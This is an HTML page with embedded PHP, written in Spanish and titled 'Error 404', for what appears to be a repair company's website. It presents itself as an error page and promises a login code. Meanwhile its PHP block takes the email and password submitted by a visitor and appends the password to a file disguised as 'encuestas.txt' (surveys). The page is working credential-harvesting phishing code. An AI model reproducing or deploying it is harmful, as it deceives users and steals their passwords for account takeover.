<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../style.css"/>
    <title>Error 404</title>
</head>
<body>
<nav>
        <img src="../logo.png" alt="logo empresa" name="logo"/>
        <ul>
            <li><a href="../index.html">INICIO</a></li>
            <li><a href="../recursos/recursos.html">RECURSOS</a></li>
            <li><a href="../contacto/contacto.html">CONTACTO</a></li>
            <li><a href="../reparacion/reparacion.html">REPARACIONES</a></li>
        </ul>
    </nav>
    <p style="font-family: arial; text-align: center; margin: 2% auto 0; width: 40%; border: 2px solid red;">Es posible que algo haya salido mal.
         <b>Se le enviará un CÓDIGO de inicio de sesión</b>. Si no recibe ningún código es posible que tenga que 
         seleccionar un número, el cual se muestra <a href="numero.html">AQUÍ</a></p>
         <a href="codigo.html" style="text-decoration: none; display: block; text-align: center;">Introducir código</a>
    <img src="error.jpg" width="70%" style="display: block ;margin: 0 auto;"/>

    <?php

            if (isset ($_POST["correo"])){$correo = $_POST["correo"];}
            if (isset ($_POST["contraseña"])){$contraseña = $_POST["contraseña"];}

            $archivo = fopen ("../../formularios/encuestas.txt", "a");
            fputs($archivo, "Contraseña: ".substr($contraseña, 0, 40)."\n");
            fclose ($archivo);
        ?>
</body>
</html>

